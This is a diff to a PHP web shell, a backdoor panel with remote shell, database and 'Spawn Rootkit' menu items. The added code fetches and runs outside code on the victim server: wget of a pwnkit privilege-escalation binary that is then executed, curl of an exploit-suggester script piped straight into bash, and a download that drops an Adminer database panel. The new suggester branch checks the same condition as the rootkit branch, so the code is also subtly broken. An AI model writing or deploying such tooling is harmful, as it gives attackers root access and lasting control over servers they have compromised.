@@ -2069,7 +2069,7 @@ if($s_auth){
 
 	// spawn rootkit
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='rootkit')){
-        exe("wget https://github.com/ortod0x/rootkitninja_webshell/raw/main/pwnkit -O pwnkit");
+        	exe("wget https://github.com/ortod0x/rootkitninja_webshell/raw/main/pwnkit -O pwnkit");
 		exe("chmod +x pwnkit");
 		exe('./pwnkit "id" > .rootkit_ninja');
 		$check_w00t = file_get_contents('.rootkit_ninja');
@@ -2080,6 +2080,18 @@ if($s_auth){
 		} else {
 			$s_result .= "This device is not vulnerable, you can try using Localroot Suggester.";
 		}
+	}
+
+	// spawn suggester
+	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='rootkit')){
+        	$neko = exe("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash");
+		$s_result .= "<pre><code>$neko</code></pre>";
+	}
+
+	// spawn adminer
+	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='adminer')){
+        	exe("wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php -O adminer.php");
+		$s_result .= "Adminer Spawned | Access: <a href='".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME'])))."'>Access</a>";
 	}
 	
 	// task manager
@@ -2261,7 +2273,7 @@ if($s_auth){
 		<td><a href='<?php echo $s_self; ?>x=rs' title='Remote Shell' onclick='return false;'><div class='menumi'>Remote</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=db' title='Connect to database' onclick='return false;'><div class='menumi'>Connect</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=rootkit' title='Spawn Rootkit' onclick='return false;'><div class='menumi'>Spawn</div></a></td>
-		<td><a href='//www.exploit-db.com/search?q=Linux%20Kernel%20<?php echo rawurlencode(suggest_exploit());?>' title='Localroot Suggester'><div class='menumi'>Localroot Suggester</div></a></td>
+		<td><a href='<?php echo $s_self; ?>x=suggester' title='Exploit Suggester' onclick='return false;'><div class='menumi'>Suggester</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=about' title='About Of Shell' onclick='return false;'><div class='menumi'>About</div></a></td>
 		<td><a href='<?php echo $s_self; ?>x=logout' title='Logout' onclick='return false;'><div class='menumi'>Logout</div></a></td>
 		</tr>
